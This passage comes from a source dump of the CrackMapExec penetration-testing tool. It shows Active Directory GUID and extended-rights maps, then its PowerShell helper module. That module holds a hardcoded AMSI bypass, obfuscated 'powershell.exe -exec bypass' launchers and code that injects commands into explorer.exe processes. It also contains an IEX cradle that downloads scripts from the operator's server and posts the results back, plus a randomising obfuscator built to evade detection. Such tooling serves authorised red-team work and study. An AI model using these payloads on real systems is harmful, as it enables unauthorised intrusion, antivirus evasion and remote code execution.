""FRS-Directory-Filter"",\n    ""eadd3dfe-ae0e-4cc2-b9b9-5fe5b6ed2dd2"": ""ms-DS-Required-Domain-Behavior-Version"",\n    ""87b78d51-405f-4b7f-80ed-2bd28786f48d"": ""ms-WMI-ScopeGuid"",\n    ""b4b54e50-943a-11d1-aebd-0000f80367c1"": ""Purported-Search"",\n    ""1cf41bba-5604-463e-94d6-1a1287b72ca3"": ""ms-TS-Broken-Connection-Action"",\n    ""bf967aa6-0de6-11d0-a285-00aa003049e2"": ""Package-Registration"",\n    ""1be8f177-a9ff-11d0-afe2-00c04fd930c9"": ""FRS-DS-Poll"",\n    ""4beca2e8-a653-41b2-8fee-721575474bec"": ""ms-DS-Required-Forest-Behavior-Version"",\n    ""34f7ed6c-615d-418d-aa00-549a7d7be03e"": ""ms-WMI-SourceOrganization"",\n    ""bf967a09-0de6-11d0-a285-00aa003049e2"": ""Pwd-History-Length"",\n    ""23572aaf-29dd-44ea-b0fa-7e8438b9a4a3"": ""ms-TS-Connect-Client-Drives"",\n    ""bf967a8d-0de6-11d0-a285-00aa003049e2"": ""Cross-Ref"",\n    ""52458020-ca6a-11d0-afff-0000f80367c1"": ""FRS-Extensions"",\n    ""b77ea093-88d0-4780-9a98-911f8e8b1dca"": ""ms-DS-Resultant-PSO"",\n    ""152e42b6-37c5-4f55-ab48-1606384a9aea"": ""ms-WMI-stringDefault"",\n    ""bf967a0a-0de6-11d0-a285-00aa003049e2"": ""Pwd-Last-Set"",\n    ""8ce6a937-871b-4c92-b285-d99d4036681c"": ""ms-TS-Connect-Printer-Drives"",\n    ""1be8f178-a9ff-11d0-afe2-00c04fd930c9"": ""FRS-Fault-Condition"",\n    ""456374ac-1f0a-4617-93cf-bc55a7c9d341"": ""ms-DS-Password-Settings-Precedence"",\n    ""37609d31-a2bf-4b58-8f53-2b64e57a076d"": ""ms-WMI-stringValidValues"",\n    ""bf967a0b-0de6-11d0-a285-00aa003049e2"": ""Pwd-Properties"",\n    ""c0ffe2bd-cacf-4dc7-88d5-61e9e95766f6"": ""ms-TS-Default-To-Main-Printer"",\n    ""ef9e60e0-56f7-11d1-a9c6-0000f80367c1"": ""Cross-Ref-Container"",\n    ""b7b13122-b82e-11d0-afee-0000f80367c1"": ""Physical-Location"",\n    ""1be8f170-a9ff-11d0-afe2-00c04fd930c9"": ""FRS-File-Filter"",\n    ""d1e169a4-ebe9-49bf-8fcb-8aef3874592d"": ""ms-DS-Max-Values"",\n    ""95b6d8d6-c9e8-4661-a2bc-6a5cabc04c62"": ""ms-WMI-TargetClass"",\n    ""80a67e4e-9f22-11d0-afdd-00c04fd930c9"": ""Quality-Of-Service"",\n    ""a744f666-3d3c-4cc8-834b-9d4f6f687b8b"": ""ms-TS-Work-Directory"",\n    ""2a13257d-9373-11d1-aebc-0000f80367c1"": ""FRS-Flags"",\n    ""cbf7e6cd-85a4-4314-8939-8bfe80597835"": ""ms-DS-Members-For-Az-Role"",\n    ""1c4ab61f-3420-44e5-849d-8b5dbf60feb7"": ""ms-WMI-TargetNameSpace"",\n    ""cbf70a26-7e78-11d2-9921-0000f87a57d4"": ""Query-Filter"",\n    ""9201ac6f-1d69-4dfb-802e-d95510109599"": ""ms-TS-Initial-Program"",\n    ""bf967a8e-0de6-11d0-a285-00aa003049e2"": ""Device"",\n    ""e5209ca2-3bba-11d2-90cc-00c04fd91ab1"": ""PKI-Certificate-Template"",\n    ""5245801e-ca6a-11d0-afff-0000f80367c1"": ""FRS-Level-Limit"",\n    ""ececcd20-a7e0-4688-9ccf-02ece5e287f5"": ""ms-DS-Members-For-Az-Role-BL"",\n    ""c44f67a5-7de5-4a1f-92d9-662b57364b77"": ""ms-WMI-TargetObject"",\n    ""e1aea404-cd5b-11d0-afff-0000f80367c1"": ""Query-Policy-BL"",\n    ""40e1c407-4344-40f3-ab43-3625a34a63a2"": ""ms-TS-Endpoint-Data"",\n    ""2a13257e-9373-11d1-aebc-0000f80367c1"": ""FRS-Member-Reference"",\n    ""5a2eacd7-cc2b-48cf-9d9a-b6f1a0024de9"": ""ms-DS-NC-Type"",\n    ""5006a79a-6bfe-4561-9f52-13cf4dd3e560"": ""ms-WMI-TargetPath"",\n    ""e1aea403-cd5b-11d0-afff-0000f80367c1"": ""Query-Policy-Object"",\n    ""377ade80-e2d8-46c5-9bcd-6d9dec93b35e"": ""ms-TS-Endpoint-Type"",\n    ""8447f9f2-1027-11d0-a05f-00aa006c33ed"": ""Dfs-Configuration"",\n    ""ee4aa692-3bba-11d2-90cc-00c04fd91ab1"": ""PKI-Enrollment-Service"",\n    ""2a13257f-9373-11d1-aebc-0000f80367c1"": ""FRS-Member-Reference-BL"",\n    ""cafcb1de-f23c-46b5-adf7-1e64957bd5db"": ""ms-DS-Non-Members"",\n    ""ca2a281e-262b-4ff7-b419-bc123352a4e9"": ""ms-WMI-TargetType"",\n    ""7bfdcb86-4807-11d1-a9c3-0000f80367c1"": ""QueryPoint"",\n    ""3c08b569-801f-4158-b17b-e363d6ae696a"": ""ms-TS-Endpoint-Plugin"",\n}\n\n\nEXTENDED_RIGHTS = {\n    ""ab721a52-1e2f-11d0-9819-00aa0040529b"": ""Domain-Administer-Server"",\n    ""ab721a53-1e2f-11d0-9819-00aa0040529b"": ""User-Change-Password"",\n    ""00299570-246d-11d0-a768-00aa006e0529"": ""User-Force-Change-Password"",\n    ""ab721a55-1e2f-11d0-9819-00aa0040529b"": ""Send-To"",\n    ""c7407360-20bf-11d0-a768-00aa006e0529"": ""Domain-Password"",\n    ""59ba2f42-79a2-11d0-9020-00c04fc2d3cf"": ""General-Information"",\n    ""4c164200-20c0-11d0-a768-00aa006e0529"": ""User-Account-Restrictions"",\n    ""5f202010-79a5-11d0-9020-00c04fc2d4cf"": ""User-Logon"",\n    ""bc0ac240-79a9-11d0-9020-00c04fc2d4cf"": ""Membership"",\n    ""a1990816-4298-11d1-ade2-00c04fd8d5cd"": ""Open-Address-Book"",\n    ""e45795b2-9455-11d1-aebd-0000f80367c1"": ""Email-Information"",\n    ""e45795b3-9455-11d1-aebd-0000f80367c1"": ""Web-Information"",\n    ""1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"": ""DS-Replication-Get-Changes"",\n    ""1131f6ab-9c07-11d1-f79f-00c04fc2dcd2"": ""DS-Replication-Synchronize"",\n    ""1131f6ac-9c07-11d1-f79f-00c04fc2dcd2"": ""DS-Replication-Manage-Topology"",\n    ""e12b56b6-0a95-11d1-adbb-00c04fd8d5cd"": ""Change-Schema-Master"",\n    ""d58d5f36-0a98-11d1-adbb-00c04fd8d5cd"": ""Change-Rid-Master"",\n    ""fec364e0-0a98-11d1-adbb-00c04fd8d5cd"": ""Do-Garbage-Collection"",\n    ""0bc1554e-0a99-11d1-adbb-00c04fd8d5cd"": ""Recalculate-Hierarchy"",\n    ""1abd7cf8-0a99-11d1-adbb-00c04fd8d5cd"": ""Allocate-Rids"",\n    ""bae50096-4752-11d1-9052-00c04fc2d4cf"": ""Change-PDC"",\n    ""440820ad-65b4-11d1-a3da-0000f875ae0d"": ""Add-GUID"",\n    ""014bf69c-7b3b-11d1-85f6-08002be74fab"": ""Change-Domain-Master"",\n    ""4b6e08c0-df3c-11d1-9c86-006008764d0e"": ""msmq-Receive-Dead-Letter"",\n    ""4b6e08c1-df3c-11d1-9c86-006008764d0e"": ""msmq-Peek-Dead-Letter"",\n    ""4b6e08c2-df3c-11d1-9c86-006008764d0e"": ""msmq-Receive-computer-Journal"",\n    ""4b6e08c3-df3c-11d1-9c86-006008764d0e"": ""msmq-Peek-computer-Journal"",\n    ""06bd3200-df3e-11d1-9c86-006008764d0e"": ""msmq-Receive"",\n    ""06bd3201-df3e-11d1-9c86-006008764d0e"": ""msmq-Peek"",\n    ""06bd3202-df3e-11d1-9c86-006008764d0e"": ""msmq-Send"",\n    ""06bd3203-df3e-11d1-9c86-006008764d0e"": ""msmq-Receive-journal"",\n    ""b4e60130-df3f-11d1-9c86-006008764d0e"": ""msmq-Open-Connector"",\n    ""edacfd8f-ffb3-11d1-b41d-00a0c968f939"": ""Apply-Group-Policy"",\n    ""037088f8-0ae1-11d2-b422-00a0c968f939"": ""RAS-Information"",\n    ""9923a32a-3607-11d2-b9be-0000f87a36b2"": ""DS-Install-Replica"",\n    ""cc17b1fb-33d9-11d2-97d4-00c04fd8d5cd"": ""Change-Infrastructure-Master"",\n    ""be2bb760-7f46-11d2-b9ad-00c04f79f805"": ""Update-Schema-Cache"",\n    ""62dd28a8-7f46-11d2-b9ad-00c04f79f805"": ""Recalculate-Security-Inheritance"",\n    ""69ae6200-7f46-11d2-b9ad-00c04f79f805"": ""DS-Check-Stale-Phantoms"",\n    ""0e10c968-78fb-11d2-90d4-00c04f79dc55"": ""Certificate-Enrollment"",\n    ""bf9679c0-0de6-11d0-a285-00aa003049e2"": ""Self-Membership"",\n    ""72e39547-7b18-11d1-adef-00c04fd8d5cd"": ""Validated-DNS-Host-Name"",\n    ""b7b1b3dd-ab09-4242-9e30-9980e5d322f7"": ""Generate-RSoP-Planning"",\n    ""9432c620-033c-4db7-8b58-14ef6d0bf477"": ""Refresh-Group-Cache"",\n    ""91d67418-0135-4acc-8d79-c08e857cfbec"": ""SAM-Enumerate-Entire-Domain"",\n    ""b7b1b3de-ab09-4242-9e30-9980e5d322f7"": ""Generate-RSoP-Logging"",\n    ""b8119fd0-04f6-4762-ab7a-4986c76b3f9a"": ""Domain-Other-Parameters"",\n    ""e2a36dc9-ae17-47c3-b58b-be34c55ba633"": ""Create-Inbound-Forest-Trust"",\n    ""1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"": ""DS-Replication-Get-Changes-All"",\n    ""ba33815a-4f93-4c76-87f3-57574bff8109"": ""Migrate-SID-History"",\n    ""45ec5156-db7e-47bb-b53f-dbeb2d03c40f"": ""Reanimate-Tombstones"",\n    ""2f16c4a5-b98e-432c-952a-cb388ba33f2e"": ""DS-Execute-Intentions-Script"",\n    ""f98340fb-7c5b-4cdb-a00b-2ebdfa115a96"": ""DS-Replication-Monitor-Topology"",\n    ""280f369c-67c7-438e-ae98-1d46f3c6f541"": ""Update-Password-Not-Required-Bit"",\n    ""ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501"": ""Unexpire-Password"",\n    ""05c74c5e-4deb-43b4-bd9f-86664c2a7fd5"": ""Enable-Per-User-Reversibly-Encrypted-Password"",\n    ""4ecc03fe-ffc0-4947-b630-eb672a8a9dbc"": ""DS-Query-Self-Quota"",\n    ""91e647de-d96f-4b70-9557-d63ff4f3ccd8"": ""Private-Information"",\n    ""1131f6ae-9c07-11d1-f79f-00c04fc2dcd2"": ""Read-Only-Replication-Secret-Synchronization"",\n    ""5805bc62-bdc9-4428-a5e2-856a0f4c185e"": ""Terminal-Server-License-Server"",\n    ""1a60ea8d-58a6-4b20-bcdc-fb71eb8a9ff8"": ""Reload-SSL-Certificate"",\n    ""89e95b76-444d-4c62-991a-0facbeda640c"": ""DS-Replication-Get-Changes-In-Filtered-Set"",\n    ""7726b9d5-a4b4-4288-a6b2-dce952e80a7f"": ""Run-Protect-Admin-Groups-Task"",\n    ""7c0e2a7c-a419-48e4-a995-10180aad54dd"": ""Manage-Optional-Features"",\n    ""3e0f7e18-2c7a-4c10-ba82-4d926db99a3e"": ""DS-Clone-Domain-Controller"",\n    ""d31a8757-2447-4545-8081-3bb610cacbf2"": ""Validated-MS-DS-Behavior-Version"",\n    ""80863791-dbe9-4eb8-837e-7f0ab55d9ac7"": ""Validated-MS-DS-Additional-DNS-Host-Name"",\n    ""a05b8cc2-17bc-4802-a710-e7c15ab866a2"": ""Certificate-AutoEnrollment"",\n    ""4125c71f-7fac-4ff0-bcb7-f09a41325286"": ""DS-Set-Owner"",\n    ""88a9933e-e5c8-4f2a-9dd7-2527416b8092"": ""DS-Bypass-Quota"",\n    ""084c93a2-620d-4879-a836-f0ae47de0e89"": ""DS-Read-Partition-Secrets"",\n    ""94825a8d-b171-4116-8146-1e34d8f54401"": ""DS-Write-Partition-Secrets"",\n    ""9b026da6-0d3c-465c-8bee-5199d7165cba"": ""DS-Validated-Write-Computer"",\n    ""ab721a54-1e2f-11d0-9819-00aa0040529b"": ""Send-As"",\n    ""ab721a56-1e2f-11d0-9819-00aa0040529b"": ""Receive-As"",\n    ""77b5b886-944a-11d1-aebd-0000f80367c1"": ""Personal-Information"",\n    ""e48d0154-bcf8-11d1-8702-00c04fb96050"": ""Public-Information"",\n    ""f3a64788-5306-11d1-a9c5-0000f80367c1"": ""Validated-SPN"",\n    ""68b1d179-0d15-4d4f-ab71-46152e79a7bc"": ""Allowed-To-Authenticate"",\n    ""ffa6f046-ca4b-4feb-b40d-04dfee722543"": ""MS-TS-GatewayAccess"",\n}\n', 'powershell.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport os\nimport re\nfrom sys import exit\nfrom string import ascii_lowercase\nfrom random import choice, sample\nfrom subprocess import call\nfrom cme.helpers.misc import which\nfrom cme.logger import cme_logger\nfrom cme.paths import CME_PATH, DATA_PATH\nfrom base64 import b64encode\n\nobfuscate_ps_scripts = False\n\n\ndef get_ps_script(path):\n    return os.path.join(DATA_PATH, path)\n\n\ndef encode_ps_command(command):\n    return b64encode(command.encode(""UTF-16LE"")).decode()\n\n\ndef is_powershell_installed():\n    if which(""powershell""):\n        return True\n    return False\n\n\ndef obfs_ps_script(path_to_script):\n    ps_script = path_to_script.split(""/"")[-1]\n    obfs_script_dir = os.path.join(CME_PATH, ""obfuscated_scripts"")\n    obfs_ps_script = os.path.join(obfs_script_dir, ps_script)\n\n    if is_powershell_installed() and obfuscate_ps_scripts:\n        if os.path.exists(obfs_ps_script):\n            cme_logger.display(""Using cached obfuscated Powershell script"")\n            with open(obfs_ps_script, ""r"") as script:\n                return script.read()\n\n        cme_logger.display(""Performing one-time script obfuscation, go look at some memes cause this can take a bit..."")\n\n        invoke_obfs_command = f""powershell -C \'Import-Module {get_ps_script(\'invoke-obfuscation/Invoke-Obfuscation.psd1\')};Invoke-Obfuscation -ScriptPath {get_ps_script(path_to_script)} -Command \\""TOKEN,ALL,1,OUT {obfs_ps_script}\\"" -Quiet\'""\n        cme_logger.debug(invoke_obfs_command)\n\n        with open(os.devnull, ""w"") as devnull:\n            return_code = call(invoke_obfs_command, stdout=devnull, stderr=devnull, shell=True)\n\n        cme_logger.success(""Script obfuscated successfully"")\n\n        with open(obfs_ps_script, ""r"") as script:\n            return script.read()\n\n    else:\n        with open(get_ps_script(path_to_script), ""r"") as script:\n            """"""\n            Strip block comments, line comments, empty lines, verbose statements,\n            and debug statements from a PowerShell source file.\n            """"""\n            # strip block comments\n            stripped_code = re.sub(re.compile(""<#.*?#>"", re.DOTALL), """", script.read())\n            # strip blank lines, lines starting with #, and verbose/debug statements\n            stripped_code = ""\\n"".join([line for line in stripped_code.split(""\\n"") if ((line.strip() != """") and (not line.strip().startswith(""#"")) and (not line.strip().lower().startswith(""write-verbose "")) and (not line.strip().lower().startswith(""write-debug "")))])\n\n            return stripped_code\n\n\ndef create_ps_command(ps_command, force_ps32=False, dont_obfs=False, custom_amsi=None):\n    if custom_amsi:\n        with open(custom_amsi) as file_in:\n            lines = []\n            for line in file_in:\n                lines.append(line)\n            amsi_bypass = """".join(lines)\n    else:\n        amsi_bypass = """"""[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\ntry{\n[Ref].Assembly.GetType(\'Sys\'+\'tem.Man\'+\'agement.Aut\'+\'omation.Am\'+\'siUt\'+\'ils\').GetField(\'am\'+\'siIni\'+\'tFailed\', \'NonP\'+\'ublic,Sta\'+\'tic\').SetValue($null, $true)\n}catch{}\n""""""\n\n    if force_ps32:\n        command = (\n            amsi_bypass\n            + """"""\n$functions = {{\n    function Command-ToExecute\n    {{\n{command}\n    }}\n}}\nif ($Env:PROCESSOR_ARCHITECTURE -eq \'AMD64\')\n{{\n    $job = Start-Job -InitializationScript $functions -ScriptBlock {{Command-ToExecute}} -RunAs32\n    $job | Wait-Job\n}}\nelse\n{{\n    IEX ""$functions""\n    Command-ToExecute\n}}\n"""""".format(\n                command=amsi_bypass + ps_command\n            )\n        )\n\n    else:\n        command = amsi_bypass + ps_command\n\n    cme_logger.debug(""Generated PS command:\\n {}\\n"".format(command))\n\n    # We could obfuscate the initial launcher using Invoke-Obfuscation but because this function gets executed\n    # concurrently it would spawn a local powershell process per host which isn\'t ideal, until I figure out a good way\n    # of dealing with this  it will use the partial python implementation that I stole from GreatSCT\n    # (https://github.com/GreatSCT/GreatSCT) <3\n\n    """"""\n    if is_powershell_installed():\n\n        temp = tempfile.NamedTemporaryFile(prefix=\'cme_\',\n                                           suffix=\'.ps1\',\n                                           dir=\'/tmp\')\n        temp.write(command)\n        temp.read()\n\n        encoding_types = [1,2,3,4,5,6]\n        while True:\n            encoding = random.choice(encoding_types)\n            invoke_obfs_command = \'powershell -C \\\'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command ""ENCODING,{}"" -Quiet\\\'\'.format(get_ps_script(\'invoke-obfuscation/Invoke-Obfuscation.psd1\'),\n                                                                                                                                              temp.name,\n                                                                                                                                              encoding)\n            cme_logger.debug(invoke_obfs_command)\n            out = check_output(invoke_obfs_command, shell=True).split(\'\\n\')[4].strip()\n\n            command = \'powershell.exe -exec bypass -noni -nop -w 1 -C ""{}""\'.format(out)\n            cme_logger.debug(\'Command length: {}\'.format(len(command)))\n\n            if len(command) <= 8192:\n                temp.close()\n                break\n\n            encoding_types.remove(encoding)\n    \n    else:\n    """"""\n    if not dont_obfs:\n        obfs_attempts = 0\n        while True:\n            command = f\'powershell.exe -exec bypass -noni -nop -w 1 -C ""{invoke_obfuscation(command)}""\'\n            if len(command) <= 8191:\n                break\n\n            if obfs_attempts == 4:\n                cme_logger.error(f""Command exceeds maximum length of 8191 chars (was {len(command)}). exiting."")\n                exit(1)\n\n            obfs_attempts += 1\n    else:\n        command = f""powershell.exe -noni -nop -w 1 -enc {encode_ps_command(command)}""\n        if len(command) > 8191:\n            cme_logger.error(f""Command exceeds maximum length of 8191 chars (was {len(command)}). exiting."")\n            exit(1)\n\n    return command\n\n\ndef gen_ps_inject(command, context=None, procname=""explorer.exe"", inject_once=False):\n    # The following code gives us some control over where and how Invoke-PSInject does its thang\n    # It prioritizes injecting into a process of the active console session\n    ps_code = """"""\n$injected = $False\n$inject_once = {inject_once}\n$command = ""{command}""\n$owners = @{{}}\n$console_login = gwmi win32_computersystem | select -exp Username\ngwmi win32_process | where {{$_.Name.ToLower() -eq \'{procname}\'.ToLower()}} | % {{\n    if ($_.getowner().domain -and $_.getowner().user){{\n    $owners[$_.getowner().domain + ""\\\\"" + $_.getowner().user] = $_.handle\n    }}\n}}\ntry {{\n    if ($owners.ContainsKey($console_login)){{\n        Invoke-PSInject -ProcId $owners.Get_Item($console_login) -PoshCode $command\n        $injected = $True\n        $owners.Remove($console_login)\n    }}\n}}\ncatch {{}}\nif (($injected -eq $False) -or ($inject_once -eq $False)){{\n    foreach ($owner in $owners.Values) {{\n        try {{\n            Invoke-PSInject -ProcId $owner -PoshCode $command\n        }}\n        catch {{}}\n    }}\n}}\n"""""".format(\n        inject_once=""$True"" if inject_once else ""$False"",\n        command=encode_ps_command(command),\n        procname=procname,\n    )\n\n    if context:\n        return gen_ps_iex_cradle(context, ""Invoke-PSInject.ps1"", ps_code, post_back=False)\n\n    return ps_code\n\n\ndef gen_ps_iex_cradle(context, scripts, command=str(), post_back=True):\n    if type(scripts) is str:\n        launcher = """"""\n[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}\n[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]\'Ssl3,Tls,Tls11,Tls12\'\nIEX (New-Object Net.WebClient).DownloadString(\'{server}://{addr}:{port}/{ps_script_name}\')\n{command}\n"""""".format(\n            server=context.server,\n            port=context.server_port,\n            addr=context.localip,\n            ps_script_name=scripts,\n            command=command if post_back is False else """",\n        ).strip()\n\n    elif type(scripts) is list:\n        launcher = ""[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\\n""\n        launcher += ""[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]\'Ssl3,Tls,Tls11,Tls12\'""\n        for script in scripts:\n            launcher += ""IEX (New-Object Net.WebClient).DownloadString(\'{server}://{addr}:{port}/{script}\')\\n"".format(\n                server=context.server,\n                port=context.server_port,\n                addr=context.localip,\n                script=script,\n            )\n        launcher.strip()\n        launcher += command if post_back is False else """"\n\n    if post_back is True:\n        launcher += """"""\n$cmd = {command}\n$request = [System.Net.WebRequest]::Create(\'{server}://{addr}:{port}/\')\n$request.Method = \'POST\'\n$request.ContentType = \'application/x-www-form-urlencoded\'\n$bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)\n$request.ContentLength = $bytes.Length\n$requestStream = $request.GetRequestStream()\n$requestStream.Write($bytes, 0, $bytes.Length)\n$requestStream.Close()\n$request.GetResponse()"""""".format(\n            server=context.server,\n            port=context.server_port,\n            addr=context.localip,\n            command=command,\n        )\n\n    cme_logger.debug(f""Generated PS IEX Launcher:\\n {launcher}\\n"")\n\n    return launcher.strip()\n\n\n# Following was stolen from https://raw.githubusercontent.com/GreatSCT/GreatSCT/templates/invokeObfuscation.py\ndef invoke_obfuscation(script_string):\n    # Add letters a-z with random case to $RandomDelimiters.\n    alphabet = """".join(choice([i.upper(), i]) for i in ascii_lowercase)\n\n    # Create list of random delimiters called random_delimiters.\n    # Avoid using . * \' "" [ ] ( ) etc. as delimiters as these will cause problems in the -Split command syntax.\n    random_delimiters = [\n        ""_"",\n        ""-"",\n        "","",\n        ""{"",\n        ""}"",\n        ""~"",\n        ""!"",\n        ""@"",\n        ""%"",\n        ""&"",\n        ""<"",\n        "">"",\n        "";"",\n        "":"",\n    ]\n\n    for i in alphabet:\n        random_delimiters.append(i)\n\n    # Only use a subset of current delimiters to randomize what you see in every iteration of this script\'s output.\n    random_delimiters = [choice(random_delimiters) for _ in range(int(len(random_delimiters) / 4))]\n\n    # Convert $ScriptString to delimited ASCII values in [Char] array separated by random delimiter from defined list $RandomDelimiters.\n    delimited_encoded_array = """"\n    for char in script_string:\n        delimited_encoded_array += str(ord(char)) + choice(random_delimiters)\n\n    # Remove trailing delimiter from $DelimitedEncodedArray.\n    delimited_encoded_array = delimited_encoded_array[:-1]\n    # Create printable version of $RandomDelimiters in random order to be used by final command.\n    test = sample(random_delimiters, len(random_delimiters))\n    random_delimiters_to_print = """".join(i for i in test)\n\n    # Generate random case versions for necessary operations.\n    for_each_object = choice([""ForEach"", ""ForEach-Object"", ""%""])\n    str_join = """".join(choice([i.upper(), i.lower()]) for i in ""[String]::Join"")\n    str_str = """".join(choice([i.upper(), i.lower()]) for i in ""[String]"")\n    join = """".join(choice([i.upper(), i.lower()]) for i in ""-Join"")\n    char_str = """".join(choice([i.upper(), i.lower()]) for i in ""Char"")\n    integer = """".join(choice([i.upper(), i.lower()]) for i in ""Int"")\n    for_each_object = """".join(choice([i.upper(), i.lower()]) for i in for_each_object)\n\n    # Create printable version of $RandomDelimiters in random order to be used by final command specifically for -Split syntax\n    random_delimiters_to_print_for_dash_split = """"\n\n    for delim in random_delimiters:\n        # Random case \'split\' string.\n        split = """".join(choice([i.upper(), i.lower()]) for i in ""Split"")\n        random_delimiters_to_print_for_dash_split += ""-"" + split + choice(["""", "" ""]) + ""\'"" + delim + ""\'"" + choice(["""", "" ""])\n\n    random_delimiters_to_print_for_dash_split = random_delimiters_to_print_for_dash_split.strip(""\\t\\n\\r"")\n    # Randomly select between various conversion syntax options.\n    random_conversion_syntax = [\n        ""["" + char_str + ""]"" + choice(["""", "" ""]) + ""["" + integer + ""]"" + choice(["""", "" ""]) + ""$_"",\n        ""["" + integer + ""]"" + choice(["""", "" ""]) + ""$_"" + choice(["""", "" ""]) + choice([""-as"", ""-As"", ""-aS"", ""-AS""]) + choice(["""", "" ""]) + ""["" + char_str + ""]"",\n    ]\n    random_conversion_syntax = choice(random_conversion_syntax)\n\n    # Create array syntax for encoded scriptString as alternative to .Split/-Split syntax.\n    encoded_array = """"\n    for char in script_string:\n        encoded_array += str(ord(char)) + choice(["""", "" ""]) + "","" + choice(["""", "" ""])\n\n    # Remove trailing comma from encoded_array\n    encoded_array = ""("" + choice(["""", "" ""]) + encoded_array.rstrip().rstrip("","") + "")""\n\n    # Generate random syntax to create/set OFS variable ($OFS is the Output Field Separator automatic variable).\n    # Using Set-Item and Set-Variable/SV/SET syntax. Not using New-Item in case OFS variable already exists.\n    # If the OFS variable did exist then we could use even more syntax:\n    # $varname, Set-Variable/SV, Set-Item/SET, Get-Variable/GV/Variable, Get-ChildItem/GCI/ChildItem/Dir/Ls\n    # For more info:\n    # https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.core/about/about_automatic_variables\n\n    set_ofs_var_syntax = [\n        ""Set-Item"" + choice(["" "" * 1, "" "" * 2]) + ""\'Variable:OFS\'"" + choice(["" "" * 1, "" "" * 2]) + ""\'\'"",\n        choice([""Set-Variable"", ""SV"", ""SET""]) + choice(["" "" * 1, "" "" * 2]) + ""\'OFS\'"" + choice(["" "" * 1, "" "" * 2]) + ""\'\'"",\n    ]\n    set_ofs_var = choice(set_ofs_var_syntax)\n\n    set_ofs_var_back_syntax = [\n        ""Set-Item"" + choice(["" "" * 1, "" "" * 2]) + ""\'Variable:OFS\'"" + choice(["" "" * 1, "" "" * 2]) + ""\' \'"",\n        ""Set-Item"" + choice(["" "" * 1, "" "" * 2]) + ""\'Variable:OFS\'"" + choice(["" "" * 1, "" "" * 2]) + ""\' \'"",\n    ]\n    set_ofs_var_back = choice(set_ofs_var_back_syntax)\n\n    # Randomize case of $SetOfsVar and $SetOfsVarBack.\n    set_ofs_var = """".join(choice([i.upper(), i.lower()]) for i in set_ofs_var)\n    set_ofs_var_back = """".join(choice([i.upper(), i.lower()]) for i in set_ofs_var_back)\n\n    # Generate the code that will decrypt and execute the payload and randomly select one.\n    baseScriptArray = [\n        ""["" + char_str + ""[]"" + ""]"" + choice(["""", "" ""]) + encoded_array,\n        ""("" + choice(["""", "" ""]) + ""\'"" + delimited_encoded_array + ""\'."" + split + ""("" + choice(["""", "" ""]) + ""\'"" + random_delimiters_to_print + ""\'"" + choice(["""", "" ""]) + "")"" + choice(["""", "" ""]) + ""|"" + choice(["""", "" ""]) + for_each_object + choice(["""", "" ""]) + ""{"" + choice(["""", "" ""]) + ""("" + choice(["""", "" ""]) + random_conversion_syntax + "")"" + choice(["""", "" ""]) + ""}"" + choice(["""", "" ""]) + "")"",\n        ""("" + choice(["""", "" ""]) + ""\'"" + delimited_encoded_array + ""\'"" + choice(["""", "" ""]) + random_delimiters_to_print_for_dash_split + choice(["""", "" ""]) + ""|"" + choice(["""", "" ""]) + for_each_object + choice(["""", "" ""]) + ""{"" + choice(["""", "" ""]) + ""("" + choice(["""", "" ""]) + random_conversion_syntax + "")"" + choice(["""", "" ""]) + ""}"" + choice(["""", "" ""]) + "")"",\n        ""("" + choice(["""", "" ""]) + encoded_array + choice(["""", "" ""]) + ""|"" + choice(["""", "" ""]) + for_each_object + choice(["""", "" ""]) + ""{"" + choice(["""", "" ""]) + ""("" + choice(["""", "" ""]) + random_conversion_syntax + "")"" + choice(["""", "" ""]) + ""}"" + choice(["""", "" ""]) + "")"",\n    ]\n    # Generate random JOIN syntax for all above options\n    new_script_array = [\n        choice(baseScriptArray) + choice(["""", "" ""]) + join + choice(["""", "" ""]) + ""\'\'"",\n        join + choice(["""", "" ""]) + choice(baseScriptArray),\n        str_join + ""("" + choice(["""", "" ""]) + ""\'\'"" + choice(["""", "" ""]) + "","" + choice(["""", "" ""]) + choice(baseScriptArray) + choice(["""", "" ""]) + "")"",\n        \'""\' + choice(["""", "" ""]) + ""$("" + choice(["""", "" ""]) + set_ofs_var + choice(["""", "" ""]) + "")"" + choice(["""", "" ""]) + \'""\' + choice(["""", "" ""]) + ""+"" + choice(["""", "" ""]) + str_str + choice(baseScriptArray) + choice(["""", "" ""]) + ""+"" + \'""\' + choice(["""", "" ""]) + ""$("" + choice(["""", "" ""]) + set_ofs_var_back + choice(["""", "" ""]) + "")"" + choice(["""", "" ""]) + \'""\',\n    ]\n\n    # Randomly select one of the above commands.\n    newScript = choice(new_script_array)\n\n    # Generate random invoke operation syntax\n    # Below code block is a copy from Out-ObfuscatedStringCommand.ps1\n    # It is copied into this encoding function so that this will remain a standalone script without dependencies\n    invoke_expression_syntax = [choice([""IEX"", ""Invoke-Expression""])]\n\n    # Added below slightly-randomized obfuscated ways to form the string \'iex\' and then invoke it with . or &.\n    # Though far from fully built out, these are included to highlight how IEX/Invoke-Expression is a great indicator,\n    # but not a silver bullet\n    # These methods draw on common environment variable values and PowerShell Automatic Variable\n    # values/methods/members/properties/etc.\n    invocationOperator = choice([""."", ""&""]) + choice(["""", "" ""])\n    invoke_expression_syntax.append(invocationOperator + ""( $ShellId[1]+$ShellId[13]+\'x\')"")\n    invoke_expression_syntax.append(invocationOperator + ""( $PSHome["" + choice([""4"", ""21""]) + ""]+$PSHOME["" + choice([""30"", ""34""]) + ""]+\'x\')"")\n    invoke_expression_syntax.append(invocationOperator + ""( $env:Public[13]+$env:Public[5]+\'x\')"")\n    invoke_expression_syntax.append(invocationOperator + ""( $env:ComSpec[4,"" + choice([""15"", ""24"", ""26""]) + "",25]-Join\'\')"")\n    invoke_expression_syntax.append(invocationOperator + ""(("" + choice([""Get-Variable"", ""GV"", ""Variable""]) + "" \'*mdr*\').Name[3,11,2]-Join\'\')"")\n    invoke_expression_syntax.append(invocationOperator + ""( "" + choice([""$VerbosePreference.ToString()"", ""([String]$VerbosePreference)""]) + 